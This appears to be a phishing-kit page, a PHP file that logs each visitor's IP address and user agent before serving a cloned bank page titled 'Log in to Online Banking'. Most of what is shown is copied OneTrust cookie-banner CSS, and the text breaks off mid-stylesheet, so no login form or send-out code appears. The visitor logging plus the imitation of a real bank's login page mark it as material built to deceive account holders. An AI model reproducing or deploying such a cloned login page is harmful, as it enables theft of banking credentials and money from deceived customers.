<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="en" data-useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36" data-triggered="true" style="">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>
            Log in to Online Banking
        </title>
        <meta id="ctl00_vpTag" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=1" />
        <meta http-equiv="Content-Style-Type" content="text/css" />
        <meta id="ctl00_demoNoIndex" name="robots" content="all" />
        <meta name="format-detection" content="telephone=no" />
        <link href="./files/css/master.css" rel="stylesheet" type="text/css" media="all" segment="" />
        <link href="./files/css/npc.css" rel="stylesheet" type="text/css" media="all" segment="" />
        <link href="./files/css/overlayPromptMaster.css" rel="stylesheet" type="text/css" media="all" segment="" />
        <link href="./files/css/overlayPrompt.css" rel="stylesheet" type="text/css" media="all" segment="" />

        
        
        <!-- This code will add an empty container to the page and 
                           the through the TagMan control panel will add the SiteCatalyst Tracking -->
        <!-- DataLayer Code -->
        
        <meta id="ctl00_PageIDMetaControl" name="PageID" content="LI5" />
        
        <style type="text/css" id="onetrust-style">
            #onetrust-banner-sdk {
                -ms-text-size-adjust: 100%;
                -webkit-text-size-adjust: 100%;
            }
            #onetrust-banner-sdk .onetrust-vendors-list-handler {
                cursor: pointer;
                color: #1f96db;
                font-size: inherit;
                font-weight: bold;
                text-decoration: none;
                margin-left: 5px;
            }
            #onetrust-banner-sdk .onetrust-vendors-list-handler:hover {
                color: #1f96db;
            }
            #onetrust-banner-sdk .ot-close-icon,
            #onetrust-pc-sdk .ot-close-icon {
                background-image: url("data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMzQ4LjMzM3B4IiBoZWlnaHQ9IjM0OC4zMzNweCIgdmlld0JveD0iMCAwIDM0OC4zMzMgMzQ4LjMzNCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzQ4LjMzMyAzNDguMzM0OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PHBhdGggZmlsbD0iIzU2NTY1NiIgZD0iTTMzNi41NTksNjguNjExTDIzMS4wMTYsMTc0LjE2NWwxMDUuNTQzLDEwNS41NDljMTUuNjk5LDE1LjcwNSwxNS42OTksNDEuMTQ1LDAsNTYuODVjLTcuODQ0LDcuODQ0LTE4LjEyOCwxMS43NjktMjguNDA3LDExLjc2OWMtMTAuMjk2LDAtMjAuNTgxLTMuOTE5LTI4LjQxOS0xMS43NjlMMTc0LjE2NywyMzEuMDAzTDY4LjYwOSwzMzYuNTYzYy03Ljg0Myw3Ljg0NC0xOC4xMjgsMTEuNzY5LTI4LjQxNiwxMS43NjljLTEwLjI4NSwwLTIwLjU2My0zLjkxOS0yOC40MTMtMTEuNzY5Yy0xNS42OTktMTUuNjk4LTE1LjY5OS00MS4xMzksMC01Ni44NWwxMDUuNTQtMTA1LjU0OUwxMS43NzQsNjguNjExYy0xNS42OTktMTUuNjk5LTE1LjY5OS00MS4xNDUsMC01Ni44NDRjMTUuNjk2LTE1LjY4Nyw0MS4xMjctMTUuNjg3LDU2LjgyOSwwbDEwNS41NjMsMTA1LjU1NEwyNzkuNzIxLDExLjc2N2MxNS43MDUtMTUuNjg3LDQxLjEzOS0xNS42ODcsNTYuODMyLDBDMzUyLjI1OCwyNy40NjYsMzUyLjI1OCw1Mi45MTIsMzM2LjU1OSw2OC42MTF6Ii8+PC9nPjwvc3ZnPg==");
                background-size: contain;
                background-repeat: no-repeat;
                background-position: center;
                height: 12px;
                width: 12px;
            }
            #onetrust-banner-sdk .powered-by-logo,
            #onetrust-pc-sdk .powered-by-logo {
                background-image: url("data:image/svg+xml;base64,PHN2ZyBpZD0ic3ZnLXRlc3QiIHdpZHRoPSIxNTJweCIgaGVpZ2h0PSIyNXB4IiB2aWV3Qm94PSIwIDAgMTE1MiAxNDkiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PHRpdGxlPlBvd2VyZWQgQnkgT25lVHJ1c3Q8L3RpdGxlPjxkZXNjPkxpbmsgdG8gT25lVHJ1c3QgV2Vic2l0ZTwvZGVzYz48ZyBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSIgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMjMuMDAwMDAwLCAtMjAuMDAwMDAwKSI+PGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNjU4LjAwMDAwMCwgMC4wMDAwMDApIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtOTAuMDAwMDAwLCAzNS4wMDAwMDApIj48cGF0aCBkPSJNNzYuMTgsNDIuNiBDNzYuMTgsNTUuODUzMzMzMyA3Mi44NDY2NjY3LDY2LjI3MzMzMzMgNjYuMTgsNzMuODYgQzU5LjUxMzMzMzMsODEuNDQ2NjY2NyA1MC4xOCw4NS4yNCAzOC4xOCw4NS4yNCBDMjUuOTgsODUuMjQgMTYuNTg2NjY2Nyw4MS40OTMzMzMzIDEwLDc0IEMzLjQxMzMzMzMzLDY2LjUwNjY2NjcgMC4wOCw1NiAwLDQyLjQ4IEMwLDI5IDMuMzMzMzMzMzMsMTguNTQ2NjY2NyAxMCwxMS4xMiBDMTYuNjY2NjY2NywzLjY5MzMzMzMzIDI2LjA5MzMzMzMsLTAuMDEzMzMzMzMzMyAzOC4yOCwxLjc3NjM1Njg0ZS0xNSBDNTAuMTczMzMzMywxLjc3NjM1Njg0ZS0xNSA1OS40NiwzLjc3MzMzMzMzIDY2LjE0LDExLjMyIEM3Mi44MiwxOC44NjY2NjY3IDc2LjE2NjY2NjcsMjkuMjkzMzMzMyA3Ni4xOCw0Mi42IFogTTEwLjE4LDQyLjYgQzEwLjE4LDUzLjgxMzMzMzMgMTIuNTY2NjY2Nyw2Mi4zMiAxNy4zNCw2OC4xMiBDMjIuMTEzMzMzMyw3My45MiAyOS4wNiw3Ni44MTMzMzMzIDM4LjE4LDc2LjggQzQ3LjM1MzMzMzMsNzYuOCA1NC4yOCw3My45MTMzMzMzIDU4Ljk2LDY4LjE0IEM2My42NCw2Mi4zNjY2NjY3IDY1Ljk4NjY2NjcsNTMuODUzMzMzMyA2Niw0Mi42IEM2NiwzMS40NjY2NjY3IDYzLjY2NjY2NjcsMjMuMDIgNTksMTcuMjYgQzU0LjMzMzMzMzMsMTEuNSA0Ny40MjY2NjY3LDguNjEzMzMzMzMgMzguMjgsOC42IEMyOS4xMDY2NjY3LDguNiAyMi4xMzMzMzMzLDExLjUgMTcuMzYsMTcuMyBDMTIuNTg2NjY2NywyMy4xIDEwLjIsMzEuNTMzMzMzMyAxMC4yLDQyLjYgTDEwLjE4LDQyLjYgWiIgZmlsbD0iIzZGQkU0QSIgZmlsbC1ydWxlPSJub256ZXJvIi8+PHBhdGggZD0iTTEzNS43Miw4NC4xMiBMMTM1LjcyLDQ0IEMxMzUuNzIsMzguOTQ2NjY2NyAxMzQuNTY2NjY3LDM1LjE3MzMzMzMgMTMyLjI2LDMyLjY4IEMxMjkuOTUzMzMzLDMwLjE4NjY2NjcgMTI2LjM0NjY2NywyOC45NCAxMjEuNDQsMjguOTQgQzExNC45NDY2NjcsMjguOTQgMTEwLjE4NjY2NywzMC42OTMzMzMzIDEwNy4xNiwzNC4yIEMxMDQuMTMzMzMzLDM3LjcwNjY2NjcgMTAyLjYyLDQzLjUgMTAyLjYyLDUxLjU4IEwxMDIuNjIsODQuMTIgTDkzLjIyLDg0LjEyIEw5My4yMiwyMiBMMTAwLjg2LDIyIEwxMDIuMzgsMzAuNSBMMTAyLjg0LDMwLjUgQzEwNC43ODAyOTEsMjcuNDIzMzIwOCAxMDcuNTU0NjI5LDI0Ljk2MTA5NTYgMTEwLjg0LDIzLjQgQzExNC40NzA0MDcsMjEuNjg0NjUwMSAxMTguNDQ1MTUzLDIwLjgyMjY1NyAxMjIuNDYsMjAuODggQzEyOS45NCwyMC44OCAxMzUuNTY2NjY3LDIyLjY4IDEzOS4zNCwyNi4yOCBDMTQzLjExMzMzMywyOS44OCAxNDUsMzUuNjQ2NjY2NyAxNDUsNDMuNTggTDE0NSw4NC4xMiBMMTM1LjcyLDg0LjEyIFoiIGZpbGw9IiM2RkJFNEEiLz48cGF0aCBkPSJNMTkwLjY2LDg1LjI0IEMxODEuNDg2NjY3LDg1LjI0IDE3NC4yNDY2NjcsODIuNDQ2NjY2NyAxNjguOTQsNzYuODYgQzE2My42MzMzMzMsNzEuMjczMzMzMyAxNjAuOTY2NjY3LDYzLjUxMzMzMzMgMTYwLjk0LDUzLjU4IEMxNjAuOTQsNDMuNTggMTYzLjQwNjY2NywzNS42MzMzMzMzIDE2OC4zNCwyOS43NCBDMTczLjIyMjYxOCwyMy44NjE5ODg1IDE4MC41NjQ3MzQsMjAuNTkzODk2NCAxODguMiwyMC45IEMxOTUuMTkxODE5LDIwLjU3MjgzMjkgMjAxLjk2MzQ4MSwyMy4zOTAwNzkgMjA2LjY2LDI4LjU4IEMyMTEuMTkzMzMzLDMzLjcgMjEzLjQ2LDQwLjQ0NjY2NjcgMjEzLjQ2LDQ4LjgyIEwyMTMuNDYsNTQuODIgTDE3MC43Miw1NC44MiBDMTcwLjkwNjY2Nyw2Mi4xMTMzMzMzIDE3Mi43NDY2NjcsNjcuNjQ2NjY2NyAxNzYuMjQsNzEuNDIgQzE4MC4xMTE3NTIsNzUuMzQ5Njc5OSAxODUuNDkzNDg3LDc3LjQxMzQwNzggMTkxLDc3LjA4IEMxOTcuODI0MDU2LDc3LjA0NzIxMjYgMjA0LjU2OTE3Miw3NS42MTc4NzQzIDIxMC44Miw3Mi44OCBMMjEwLjgyLDgxLjI2IEMyMDcuNzg0MDg5LDgyLjU5OTM0ODMgMjA0LjYyMTYzLDgzLjYzMTE2NzYgMjAxLjM4LDg0LjM0IEMxOTcuODQ2NDU5LDg1LjAwMjk0OTUgMTk0LjI1NDYxNCw4NS4zMDQ1MDM3IDE5MC42Niw4NS4yNCBaIE0xODguMSwyOC43OCBDMTgzLjU3NjE0MywyOC41NTc4NDQzIDE3OS4xODQ4NTgsMzAuMzQzNjMzNyAxNzYuMSwzMy42NiBDMTcyLjkxNDg0NSwzNy40NTI2ODM2IDE3MS4wNzI2MjcsNDIuMTkxODIzNCAxNzAuODYsNDcuMTQgTDIwMy40LDQ3LjE0IEMyMDMuNCw0MS4yMDY2NjY3IDIwMi4wNjY2NjcsMzYuNjY2NjY2NyAxOTkuNCwzMy41MiBDMTk2LjU2MTUzOSwzMC4yODc5MjcgMTkyLjM5NDgzNiwyOC41NDAxMjQxIDE4OC4xLDI4Ljc4IFoiIGZpbGw9IiM2RkJFNEEiIGZpbGwtcnVsZT0ibm9uemVybyIvPjxwb2x5Z29uIGZpbGw9IiM2RkJFNEEiIHBvaW50cz0iMjU2LjQyIDg0LjEyIDI0Ni44IDg0LjEyIDI0Ni44IDkuODYgMjIwLjU2IDkuODYgMjIwLjU2IDEuMyAyODIuNTYgMS4zIDI4Mi41NiA5Ljg2IDI1Ni40MiA5Ljg2Ii8+PHBhdGggZD0iTTMyMiwyMC45IEMzMjQuNDg5OTcsMjAuODc1MDQzNSAzMjYuOTc2MDQzLDIxLjEwMjg3NzcgMzI5LjQyLDIxLjU4IEwzMjguMTIsMzAuMyBDMzI1Ljg4OTkyOCwyOS43Nzc0NDM3IDMyMy42MTAxOTcsMjkuNDk1ODI5OSAzMjEuMzIsMjkuNDYgQzMxNi4zMjMyMjQsMjkuNDUyMzMxOSAzMTEuNTkwMTM5LDMxLjcwMTI4MjEgMzA4LjQ0LDM1LjU4IEMzMDQuODEzMDc5LDM5LjgxMjUyMTcgMzAyLjkwMTA2LDQ1LjI0ODkzMzcgMzAzLjA4LDUwLjgyIEwzMDMuMDgsODQuMTIgTDI5My42OCw4NC4xMiBMMjkzLjY4LDIyIEwzMDEuNDQsMjIgTDMwMi41MiwzMy41IEwzMDIuOTgsMzMuNSBDMzA0Ljk5MjUxMiwyOS43ODQyOTY3IDMwNy44NDA3MDgsMjYuNTg2OTIyNyAzMTEuMywyNC4xNiBDMzE0LjQ1MjE4OSwyMi4wMTA1NjkyIDMxOC4xODQ4MTUsMjAuODczMzM5MyAzMjIsMjAuOSBaIiBmaWxsPSIjNkZCRTRBIi8+PHBhdGggZD0iTTM0OS44NiwyMiBMMzQ5Ljg2LDYyLjMgQzM0OS44Niw2Ny4zNjY2NjY3IDM1MS4wMTMzMzMsNzEuMTQgMzUzLjMyLDczLjYyIEMzNTUuNjI2NjY3LDc2LjEgMzU5LjIzMzMzMyw3Ny4zNDY2NjY3IDM2NC4xNCw3Ny4zNiBDMzcwLjYzMzMzMyw3Ny4zNiAzNzUuMzgsNzUuNTg2NjY2NyAzNzguMzgsNzIuMDQgQzM4MS4zOCw2OC40OTMzMzMzIDM4Mi44OCw2Mi43IDM4Mi44OCw1NC42NiBMMzgyLjg4LDIyIEwzOTIuMjgsMjIgTDM5Mi4yOCw4NCBMMzg0LjUyLDg0IEwzODMuMTYsNzUuNjggTDM4Mi42Niw3NS42OCBDMzgwLjcyNzg0MSw3OC43NDM5OTkgMzc3Ljk0OTA4Niw4MS4xODIzNTY0IDM3NC42Niw4Mi43IEMzNzAuOTkxNjY5LDg0LjM3ODQzNzcgMzY2Ljk5MzQzNCw4NS4yMTIyNTc2IDM2Mi45Niw4NS4xNCBDMzU1LjQxMzMzMyw4NS4xNCAzNDkuNzYsODMuMzQ2NjY2NyAzNDYsNzkuNzYgQzM0Mi4yNCw3Ni4xNzMzMzMzIDM0MC4zNiw3MC40MzMzMzMzIDM0MC4zNiw2Mi41NCBMMzQwLjM2LDIyIEwzNDkuODYsMjIgWiIgZmlsbD0iIzZGQkU0QSIvPjxwYXRoIGQ9Ik00NTIuMjgsNjcuMTggQzQ1Mi41Mjk0NjMsNzIuNDQwMjM3OSA0NTAuMDk3OTM1LDc3LjQ2ODkwOCA0NDUuODIsODAuNTQgQzQ0MS41MTMzMzMsODMuNjczMzMzMyA0MzUuNDczMzMzLDg1LjI0IDQyNy43LDg1LjI0IEM0MTkuNDczMzMzLDg1LjI0IDQxMy4wNTMzMzMsODMuOTA2NjY2NyA0MDguNDQsODEuMjQgTDQwOC40NCw3Mi42MiBDNDExLjQ5OTMzLDc0LjE1NjEyNzQgNDE0LjcxODgwOCw3NS4zNTAwMTcyIDQxOC4wNCw3Ni4xOCBDNDIxLjI2NjI2OSw3Ny4wMjM0NzU0IDQyNC41ODUzNTMsNzcuNDYwMTk3IDQyNy45Miw3Ny40OCBDNDMxLjgzNDc3OSw3Ny42OTY2NzY5IDQzNS43Mzc5MzQsNzYuODgyOTQ0OCA0MzkuMjQsNzUuMTIgQzQ0MS41ODM0NTQsNzMuNzgyODg3MyA0NDMuMDk1MDUyLDcxLjM1NDYwNjkgNDQzLjI2MDM0Miw2OC42NjE1OTI4IEM0NDMuNDI1NjMxLDY1Ljk2ODU3ODggNDQyLjIyMjM0Myw2My4zNzM2NjYxIDQ0MC4wNiw2MS43NiBDNDM2LjI2OTg4Miw1OS4yMDM2NzM1IDQzMi4xNDQwMzIsNTcuMTg0NDk3MiA0MjcuOCw1NS43NiBDNDIzLjUwNjk2LDU0LjI2Njg2MjIgNDE5LjM3ODYzMSw1Mi4zMzY3MzQ3IDQxNS40OCw1MCBDNDEzLjI1NzUyOCw0OC42NDMwMTI1IDQxMS4zODEzNzIsNDYuNzg3Mzk4NyA0MTAsNDQuNTggQzQwOC43NjM4MDMsNDIuMzQ5OTE0IDQwOC4xNDkwNjgsMzkuODI4ODEwNyA0MDguMjIsMzcuMjggQzQwOC4wODg0MjEsMzIuNDg1NDY1OSA0MTAuNDIwNDMxLDI3Ljk1NzI5MjkgNDE0LjQsMjUuMjggQzQxOC41MiwyMi4zNiA0MjQuMTY2NjY3LDIwLjkgNDMxLjM0LDIwLjkgQzQzOC4wNzczMDMsMjAuODg3MjM1NiA0NDQuNzQ2NDY3LDIyLjI0ODI4OTUgNDUwLjk0LDI0LjkgTDQ0Ny42LDMyLjU0IEM0NDIuMjU3ODUzLDMwLjE2NDY0MTUgNDM2LjUwMzg2NCwyOC44NTM1MjAxIDQzMC42NiwyOC42OCBDNDI3LjIwODI3LDI4LjQ0NzgwNDQgNDIzLjc1NjkwNiwyOS4xMzgwNzczIDQyMC42NiwzMC42OCBDNDE4LjU0MDM2NCwzMS44MjQ4NzE4IDQxNy4yMzA4MTEsMzQuMDUxMTEzNSA0MTcuMjYsMzYuNDYgQzQxNy4yMTk0LDM3Ljk3NDIzNDMgNDE3LjY2ODI5LDM5LjQ2MTE3OTkgNDE4LjU0LDQwLjcgQzQxOS42NTQ1ODEsNDIuMDkxMjU1MSA0MjEuMDUyMTIxLDQzLjIyOTczOTQgNDIyLjY0LDQ0LjA0IEM0MjYuMTY0NjA1LDQ1Ljc5ODYwNjggNDI5Ljc5ODc5LDQ3LjMyODQzODQgNDMzLjUyLDQ4LjYyIEM0NDAuODgsNTEuMjg2NjY2NyA0NDUuODUzMzMzLDUzLjk1MzMzMzMgNDQ4LjQ0LDU2LjYyIEM0NTEuMTA5Myw1OS40NjczMzg2IDQ1Mi40OTY4NjYsNjMuMjgzMTQ2NiA0NTIuMjgsNjcuMTggTDQ1Mi4yOCw2Ny4xOCBaIiBmaWxsPSIjNkZCRTRBIi8+PHBhdGggZD0iTTQ4Ny42Miw3Ny40OCBDNDg5LjIzMzY0LDc3LjQ4NzEwOTkgNDkwLjg0NTMyLDc3LjM2NjczNTQgNDkyLjQ0LDc3LjEyIEM0OTMuNjgwOTA2LDc2Ljk0MTMxMzIgNDk0LjkwOTgzLDc2LjY4NzUxMzcgNDk2LjEyLDc2LjM2IEw0OTYuMTIsODMuNTYgQzQ5NC42ODI0MDgsODQuMTY5MjYzOSA0OTMuMTY4NDY5LDg0LjU3OTcwOTQgNDkxLjYyLDg0Ljc4IEM0ODkuODQ4ODk4LDg1LjA4MTk1MSA0ODguMDU2NTcyLDg1LjI0MjQ1NzggNDg2LjI2LDg1LjI2IEM0NzQuMjYsODUuMjYgNDY4LjI2LDc4LjkzMzMzMzMgNDY4LjI2LDY2LjI4IEw0NjguMjYsMjkuMzQgTDQ1OS4zNiwyOS4zNCBMNDU5LjM2LDI0LjggTDQ2OC4yNiwyMC44IEw0NzIuMjYsNy41NCBMNDc3LjcsNy41NCBMNDc3LjcsMjIgTDQ5NS43LDIyIEw0OTUuNywyOS4zIEw0NzcuNywyOS4zIEw0NzcuNyw2NS44OCBDNDc3LjQ5MzYyOSw2OC45NzY4NTk0IDQ3OC40NDEyMDcsNzIuMDQwNDU4OCA0ODAuMzYsNzQuNDggQzQ4Mi4yMTQ5MjgsNzYuNTA3Nzc1MSA0ODQuODc0NzI1LDc3LjYwNjg2NDkgNDg3LjYyLDc3LjQ4IEw0ODcuNjIsNzcuNDggWiIgZmlsbD0iIzZGQkU0QSIvPjwvZz48L2c+PHRleHQgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjkwIiBmb250LXdlaWdodD0iNTAwIiBmaWxsPSIjNjk2OTY5Ij48dHNwYW4geD0iMTQuMjU0ODgyOCIgeT0iMTEzIj5Qb3dlcmVkIGJ5PC90c3Bhbj48L3RleHQ+PC9nPjwvZz48L3N2Zz4=");
                background-size: contain;
                background-repeat: no-repeat;
                background-position: center;
                height: 25px;
                width: 152px;
                display: block;
            }
            #onetrust-banner-sdk h3 *,
            #onetrust-banner-sdk h4 *,
            #onetrust-banner-sdk h6 *,
            #onetrust-banner-sdk button *,
            #onetrust-banner-sdk a[data-parent-id] *,
            #onetrust-pc-sdk h3 *,
            #onetrust-pc-sdk h4 *,
            #onetrust-pc-sdk h6 *,
            #onetrust-pc-sdk button *,
            #onetrust-pc-sdk a[data-parent-id] * {
                font-size: inherit;
                font-weight: inherit;
                color: inherit;
            }
            #onetrust-banner-sdk .hide,
            #onetrust-pc-sdk .hide {
                display: none !important;
            }
            #onetrust-pc-sdk .ot-sdk-row .ot-sdk-column {
                padding: 0;
            }
            #onetrust-pc-sdk .ot-sdk-container {
                padding-right: 0;
            }
            #onetrust-pc-sdk .ot-sdk-row {
                flex-direction: initial;
                width: 100%;
            }
            #onetrust-pc-sdk [type="checkbox"]:checked,
            #onetrust-pc-sdk [type="checkbox"]:not(:checked) {
                pointer-events: initial;
            }
            #onetrust-pc-sdk [type="checkbox"]:disabled + label::before,
            #onetrust-pc-sdk [type="checkbox"]:disabled + label:after,
            #onetrust-pc-sdk [type="checkbox"]:disabled + label {
                pointer-events: none;
                opacity: 0.7;
            }
            #onetrust-pc-sdk #vendor-list-content {
                transform: translate3d(0, 0, 0);
            }
            #onetrust-pc-sdk li input[type="checkbox"] {
                z-index: 1;
            }
            #onetrust-pc-sdk li .ot-checkbox label {
                z-index: 2;
            }
            #onetrust-pc-sdk li .ot-checkbox input[type="checkbox"] {
                height: auto;
                width: auto;
            }
            #onetrust-pc-sdk li .host-title a,
            #onetrust-pc-sdk li .accordion-text {
                z-index: 2;
                position: relative;
            }
            #onetrust-pc-sdk input {
                margin: 3px 0.1ex;
            }
            #onetrust-pc-sdk .toggle-always-active {
                opacity: 0.6;
                cursor: default;
            }
            #onetrust-pc-sdk .screen-reader-only {
                border: 0;
                clip: rect(0 0 0 0);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                padding: 0;
                position: absolute;
                width: 1px;
            }
            #onetrust-pc-sdk .pc-logo {
                height: 60px;
                width: 180px;
                background-position: center;
                background-size: contain;
                background-repeat: no-repeat;
            }
            #onetrust-pc-sdk .ot-tooltip .ot-tooltiptext {
                visibility: hidden;
                width: 120px;
                background-color: #555;
                color: #fff;
                text-align: center;
                padding: 5px 0;
                border-radius: 6px;
                position: absolute;
                z-index: 1;
                bottom: 125%;
                left: 50%;
                margin-left: -60px;
                opacity: 0;
                transition: opacity 0.3s;
            }
            #onetrust-pc-sdk .ot-tooltip .ot-tooltiptext::after {
                content: "";
                position: absolute;
                top: 100%;
                left: 50%;
                margin-left: -5px;
                border-width: 5px;
                border-style: solid;
                border-color: #555 transparent transparent transparent;
            }
            #onetrust-pc-sdk .ot-tooltip:hover .ot-tooltiptext {
                visibility: visible;
                opacity: 1;
            }
            #onetrust-pc-sdk .ot-tooltip {
                position: relative;
                display: inline-block;
                z-index: 3;
            }
            #onetrust-pc-sdk .ot-tooltip svg {
                color: grey;
                height: 20px;
                width: 20px;
            }
            #onetrust-pc-sdk.ot-fade-in,
            .onetrust-pc-dark-filter.ot-fade-in {
                animation-name: onetrust-fade-in;
                animation-duration: 400ms;
                animation-timing-function: ease-in-out;
            }
            #onetrust-pc-sdk.hide {
                display: none !important;
            }
            .onetrust-pc-dark-filter.hide {
                display: none !important;
            }
            #ot-sdk-btn.ot-sdk-show-settings,
            #ot-sdk-btn.optanon-show-settings {
                color: #68b631;
                border: 1px solid #68b631;
                height: auto;
                white-space: normal;
                word-wrap: break-word;
                padding: 0.8em 2em;
                font-size: 0.8em;
                line-height: 1.2;
                cursor: pointer;
                -moz-transition: 0.1s ease;
                -o-transition: 0.1s ease;
                -webkit-transition: 1s ease;
                transition: 0.1s ease;
            }
            #ot-sdk-btn.ot-sdk-show-settings:hover,
            #ot-sdk-btn.optanon-show-settings:hover {
                color: #fff;
                background-color: #68b631;
            }
            #ot-sdk-btn.ot-sdk-show-settings:focus,
            #ot-sdk-btn.optanon-show-settings:focus {
                outline: none;
            }
            .onetrust-pc-dark-filter {
                background: rgba(0, 0, 0, 0.5);
                z-index: 2147483646;
                width: 100%;
                height: 100%;
                overflow: hidden;
                position: fixed;
                top: 0;
                bottom: 0;
                left: 0;
            }
            @keyframes onetrust-fade-in {
                0% {
                    opacity: 0;
                }
                100% {
                    opacity: 1;
                }
            }
            @media only screen and (min-width: 426px) and (max-width: 896px) and (orientation: landscape) {
                #onetrust-pc-sdk p {
                    font-size: 0.75em;
                }
            }
            #onetrust-banner-sdk,
            #onetrust-pc-sdk,
            #ot-sdk-cookie-policy {
                font-size: 16px;
            }
            #onetrust-banner-sdk *,
            #onetrust-banner-sdk ::after,
            #onetrust-banner-sdk ::before,
            #onetrust-pc-sdk *,
            #onetrust-pc-sdk ::after,
            #onetrust-pc-sdk ::before,
            #ot-sdk-cookie-policy *,
            #ot-sdk-cookie-policy ::after,
            #ot-sdk-cookie-policy ::before {
                -webkit-box-sizing: content-box;
                -moz-box-sizing: content-box;
                box-sizing: content-box;
            }
            #onetrust-banner-sdk div,
            #onetrust-banner-sdk span,
            #onetrust-banner-sdk h1,
            #onetrust-banner-sdk h2,
            #onetrust-banner-sdk h3,
            #onetrust-banner-sdk h4,
            #onetrust-banner-sdk h5,
            #onetrust-banner-sdk h6,
            #onetrust-banner-sdk p,
            #onetrust-banner-sdk img,
            #onetrust-banner-sdk svg,
            #onetrust-banner-sdk button,
            #onetrust-banner-sdk section,
            #onetrust-banner-sdk a,
            #onetrust-banner-sdk label,
            #onetrust-banner-sdk input,
            #onetrust-banner-sdk ul,
            #onetrust-banner-sdk li,
            #onetrust-banner-sdk nav,
            #onetrust-banner-sdk table,
            #onetrust-banner-sdk thead,
            #onetrust-banner-sdk tr,
            #onetrust-banner-sdk td,
            #onetrust-banner-sdk tbody,
            #onetrust-banner-sdk .ot-main-content,
            #onetrust-banner-sdk .toggle,
            #onetrust-banner-sdk #content,
            #onetrust-banner-sdk #ot-pc-content,
            #onetrust-banner-sdk .checkbox,
            #onetrust-pc-sdk div,
            #onetrust-pc-sdk span,
            #onetrust-pc-sdk h1,
            #onetrust-pc-sdk h2,
            #onetrust-pc-sdk h3,
            #onetrust-pc-sdk h4,
            #onetrust-pc-sdk h5,
            #onetrust-pc-sdk h6,
            #onetrust-pc-sdk p,
            #onetrust-pc-sdk img,
            #onetrust-pc-sdk svg,
            #onetrust-pc-sdk button,
            #onetrust-pc-sdk section,
            #onetrust-pc-sdk a,
            #onetrust-pc-sdk label,
            #onetrust-pc-sdk input,
            #onetrust-pc-sdk ul,
            #onetrust-pc-sdk li,
            #onetrust-pc-sdk nav,
            #onetrust-pc-sdk table,
            #onetrust-pc-sdk thead,
            #onetrust-pc-sdk tr,
            #onetrust-pc-sdk td,
            #onetrust-pc-sdk tbody,
            #onetrust-pc-sdk .ot-main-content,
            #onetrust-pc-sdk .toggle,
            #onetrust-pc-sdk #content,
            #onetrust-pc-sdk #ot-pc-content,
            #onetrust-pc-sdk .checkbox,
            #ot-sdk-cookie-policy div,
            #ot-sdk-cookie-policy span,
            #ot-sdk-cookie-policy h1,
            #ot-sdk-cookie-policy h2,
            #ot-sdk-cookie-policy h3,
            #ot-sdk-cookie-policy h4,
            #ot-sdk-cookie-policy h5,
            #ot-sdk-cookie-policy h6,
            #ot-sdk-cookie-policy p,
            #ot-sdk-cookie-policy img,
            #ot-sdk-cookie-policy svg,
            #ot-sdk-cookie-policy button,
            #ot-sdk-cookie-policy section,
            #ot-sdk-cookie-policy a,
            #ot-sdk-cookie-policy label,
            #ot-sdk-cookie-policy input,
            #ot-sdk-cookie-policy ul,
            #ot-sdk-cookie-policy li,
            #ot-sdk-cookie-policy nav,
            #ot-sdk-cookie-policy table,
            #ot-sdk-cookie-policy thead,
            #ot-sdk-cookie-policy tr,
            #ot-sdk-cookie-policy td,
            #ot-sdk-cookie-policy tbody,
            #ot-sdk-cookie-policy .ot-main-content,
            #ot-sdk-cookie-policy .toggle,
            #ot-sdk-cookie-policy #content,
            #ot-sdk-cookie-policy #ot-pc-content,
            #ot-sdk-cookie-policy .checkbox {
                font-family: inherit;
                font-size: initial;
                font-weight: normal;
                -webkit-font-smoothing: auto;
                letter-spacing: normal;
                line-height: normal;
                padding: 0;
                margin: 0;
                height: auto;
                min-height: 0;
                max-height: none;
                width: auto;
                min-width: 0;
                max-width: none;
                border-radius: 0;
                border: none;
                clear: none;
                float: none;
                position: static;
                bottom: auto;
                left: auto;
                right: auto;
                top: auto;
                text-align: left;
                text-decoration: none;
                text-indent: 0;
                text-shadow: none;
                text-transform: none;
                white-space: normal;
                background: none;
                overflow: visible;
                vertical-align: baseline;
                visibility: visible;
                z-index: auto;
                box-shadow: none;
            }
            #onetrust-banner-sdk label:before,
            #onetrust-banner-sdk label:after,
            #onetrust-banner-sdk .checkbox:after,
            #onetrust-banner-sdk .checkbox:before,
            #onetrust-pc-sdk label:before,
            #onetrust-pc-sdk label:after,
            #onetrust-pc-sdk .checkbox:after,
            #onetrust-pc-sdk .checkbox:before,
            #ot-sdk-cookie-policy label:before,
            #ot-sdk-cookie-policy label:after,
            #ot-sdk-cookie-policy .checkbox:after,
            #ot-sdk-cookie-policy .checkbox:before {
                content: "";
                content: none;
            }
            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                position: relative;
                width: 100%;
                max-width: 100%;
                margin: 0 auto;
                padding: 0 20px;
